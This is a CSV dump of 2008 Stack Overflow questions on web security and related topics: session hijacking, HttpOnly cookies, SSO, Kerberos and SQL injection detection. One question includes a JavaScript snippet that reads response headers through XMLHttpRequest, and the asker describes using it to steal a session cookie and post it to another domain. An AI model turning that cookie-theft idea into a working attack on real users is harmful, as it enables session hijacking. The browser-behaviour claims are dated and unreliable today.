Id,PostTypeId,AcceptedAnswerId,ParentId,CreationDate,DeletionDate,Score,ViewCount,Body,OwnerUserId,OwnerDisplayName,LastEditorUserId,LastEditorDisplayName,LastEditDate,LastActivityDate,Title,Tags,AnswerCount,CommentCount,FavoriteCount,ClosedDate,CommunityOwnedDate
"371","1","396","","2008-08-02 08:19:18","","422","100329","<p>This is a tricky one and I've always relied on techniques, such as permission-based emails (i.e. only sending to people you have permission to send to) and not using blatantly <em>spamish</em> terminology.</p>

<p>Of late, some of the emails I send out programmatically have started being shuffled into people's spam folder automatically and I'm wondering what I can do about it.</p>

<p>This is despite the fact that these particular emails are not ones that humans would mark as spam, specifically, they are emails that contain license keys that people have paid good money for, so I don't think they're going to consider them spam</p>

<p>I figure this is a big topic in which I am essentially an ignorant simpleton.</p>
","49","","1039608","dbr","2012-05-04 09:47:31","2019-08-19 21:46:54","How do you make sure email you send programmatically is not automatically marked as spam?","<email><email-spam>","22","0","309","",""
"22880","1","22913","","2008-08-22 17:02:26","","122","125530","<p>Specifically this is regarding when using a client session cookie to identify a session on the server.</p>

<p>Is the best answer to use SSL/HTTPS encryption for the entire web site, and you have the best guarantee that no man in the middle attacks will be able to sniff an existing client session cookie?</p>

<p>And perhaps second best to use some sort of encryption on the session value itself that is stored in your session cookie?</p>

<p>If a malicious user has physical access to a machine, they can still look at the filesystem to retrieve a valid session cookie and use that to hijack a session?</p>
","1341","Adam","2134","Chris Fournier","2008-08-23 15:33:17","2018-02-11 15:35:20","What is the best way to prevent session hijacking?","<security><session><cookies>","12","0","60","",""
"23931","1","","","2008-08-23 03:46:57","","156","121419","<p>Given two different image files (in whatever format I choose), I need to write a program to predict the chance if one being the illegal copy of another. The author of the copy may do stuff like rotating, making negative, or adding trivial details (as well as changing the dimension of the image).</p>

<p>Do you know any algorithm to do this kind of job?</p>
","","Lam Luu","1090562","","2015-04-18 20:55:47","2019-08-22 23:39:02","Algorithm to compare two images","<algorithm><image><image-processing><image-recognition>","9","2","157","",""
"27972","1","","","2008-08-26 13:06:14","","186","67553","<p>JavaScript needs access to cookies if AJAX is used on a site with access restrictions based on cookies. Will HttpOnly cookies work on an AJAX site? </p>

<p><em>Edit:</em> Microsoft created a way to prevent XSS attacks by disallowing JavaScript access to cookies if HttpOnly is specified. FireFox later adopted this. So my question is: If you are using AJAX on a site, like StackOverflow, are Http-Only cookies an option?</p>

<p><em>Edit 2:</em> Question 2. If the purpose of HttpOnly is to prevent JavaScript access to cookies, and you can still retrieve the cookies via JavaScript through the XmlHttpRequest Object, <strong>what is the point of HttpOnly</strong>?</p>

<p><em>Edit 3:</em> Here is a quote from Wikipedia:</p>

<blockquote>
  <p>When the browser receives such a cookie, it is supposed to use it as usual in the following HTTP exchanges, but not to make it visible to client-side scripts.[32] The <code>HttpOnly</code> flag is not part of any standard, and is not implemented in all browsers. Note that there is currently no prevention of reading or writing the session cookie via a XMLHTTPRequest. [33].</p>
</blockquote>

<p>I understand that <code>document.cookie</code> is blocked when you use HttpOnly. But it seems that you can still read cookie values in the XMLHttpRequest object, allowing for XSS. How does HttpOnly make you any safer than? By making cookies essentially read only? </p>

<p>In your example, I cannot write to your <code>document.cookie</code>, but I can still steal your cookie and post it to my domain using the XMLHttpRequest object.</p>

<pre><code>&lt;script type=""text/javascript""&gt;
    var req = null;
    try { req = new XMLHttpRequest(); } catch(e) {}
    if (!req) try { req = new ActiveXObject(""Msxml2.XMLHTTP""); } catch(e) {}
    if (!req) try { req = new ActiveXObject(""Microsoft.XMLHTTP""); } catch(e) {}
    req.open('GET', 'http://stackoverflow.com/', false);
    req.send(null);
    alert(req.getAllResponseHeaders());
&lt;/script&gt;
</code></pre>

<p><em>Edit 4:</em> Sorry, I meant that you could send the XMLHttpRequest to the StackOverflow domain, and then save the result of getAllResponseHeaders() to a string, regex out the cookie, and then post that to an external domain. It appears that Wikipedia and ha.ckers concur with me on this one, but I would love be re-educated...</p>

<p><em>Final Edit:</em> Ahh, apparently both sites are wrong, this is actually a <a href=""https://bugzilla.mozilla.org/show_bug.cgi?id=380418"" rel=""noreferrer"">bug in FireFox</a>. IE6 &amp; 7 are actually the only browsers that currently fully support HttpOnly.</p>

<p>To reiterate everything I've learned:</p>

<ul>
<li>HttpOnly restricts all access to document.cookie in IE7 &amp; and FireFox (not sure about other browsers)</li>
<li>HttpOnly removes cookie information from the response headers in XMLHttpObject.getAllResponseHeaders() in IE7.</li>
<li>XMLHttpObjects may only be submitted to the domain they originated from, so there is no cross-domain posting of the cookies.</li>
</ul>

<p><em>edit: This information is likely no longer up to date.</em></p>
","26","modesty","26","Shawn","2010-04-09 13:11:48","2016-07-16 03:25:29","How do HttpOnly cookies work with AJAX requests?","<ajax><cookies><httponly>","9","3","77","",""
"30632","1","30645","","2008-08-27 16:57:16","","610","545911","<p>What is the difference in terms of functionality between the Apache HTTP Server and Apache Tomcat?</p>

<p>I know that Tomcat is written in Java and the HTTP Server is in C, but other than that I do not really know how they are distinguished. Do they have different functionality?</p>
","277","kaybenleroll","116","Mark Harrison","2008-08-27 17:25:44","2019-06-21 09:03:04","Difference between the Apache HTTP Server and Apache Tomcat?","<apache><tomcat><webserver>","8","4","238","2012-12-29 18:43:15",""
"31326","1","","","2008-08-27 23:34:19","","24","38693","<p>I have a few internal .net web application here that require users to ""log out"" of them. I know this may seem moot on an Intranet application, but nonetheless it is there.</p>

<p>We are using Windows authentication for our Intranet apps, so we tie in to our Active Directory with Basic Authentication and the credentials get stored in the browser cache, as opposed to a cookie when using .net forms authentication.</p>

<p>In IE6+ you can leverage a special JavaScript function they created by doing the following:</p>

<pre><code>document.execCommand(""ClearAuthenticationCache"", ""false"")
</code></pre>

<p>However, for the other browsers that are to be supported (namely Firefox at the moment, but I strive for multi-browser support), I simply display message to the user that they need to close their browser to log out of the application, which effectively flushes the application cache.</p>

<p>Does anybody know of some commands/hacks/etc. that I can use in other browsers to flush the authentication cache?</p>
","71","Dillie-O","2134","Chris","2008-09-26 19:56:43","2012-02-25 15:55:04","Is there a browser equivalent to IE's ClearAuthenticationCache?","<asp.net><authentication><cross-browser>","7","0","15","",""
"36877","1","36885","","2008-08-31 14:27:50","","89","96591","<p>How can I set the cookies in my <code>PHP apps</code> as <code>HttpOnly cookies</code>?</p>
","3871","Scott Warren","4248328","Cheekysoft","2015-06-05 22:09:07","2018-06-23 22:24:21","How do you set up use HttpOnly cookies in PHP","<php><security><cookies><xss><httponly>","9","3","34","",""
"43459","1","43600","","2008-09-04 10:32:16","","5","7230","<p>can anybody recommend some really good resources for how to get Apache authenticating users with Kerberos.</p>

<p>Background reading on Kerberos would also be useful </p>

<p>Thanks</p>

<p>Peter</p>
","3720","Vagnerr","","","","2014-04-07 14:24:11","Kerberos user authentication in Apache","<apache><authentication><kerberos>","4","0","1","",""
"44509","1","","","2008-09-04 19:06:23","","104","79816","<p>Our company has multiple domains set up with one website hosted on each of the domains. At this time, each domain has its own authentication which is done via cookies. </p>

<p>When someone logged on to one domain needs to access anything from the other, the user needs to log in again using different credentials on the other website, located on the other domain. </p>

<p>I was thinking of moving towards single sign on (SSO), so that this hassle can be eliminated. I would appreciate any ideas on how this could be achieved, as I do not have any experience in this regard.</p>

<p>Thanks.</p>

<p><strong>Edit:</strong>
The websites are mix of internet (external) and intranet (internal-used within the company) sites.</p>
","1311","Pascal","90723","Forgotten Semicolon","2009-09-20 19:43:23","2013-07-23 23:31:49","Single Sign On across multiple domains","<authentication><single-sign-on>","4","3","98","2013-05-20 02:11:16",""
"45093","1","45096","","2008-09-05 02:00:32","","5","16947","<p>Is there a Regular Expression that can detect SQL in a string? Does anyone have a sample of something that they have used before to share?</p>
","4541","JC Grubbs","2932774","","2015-04-29 16:14:51","2018-02-01 17:42:47","RegEx to Detect SQL Injection","<sql><regex><sql-injection>","5","2","","",""
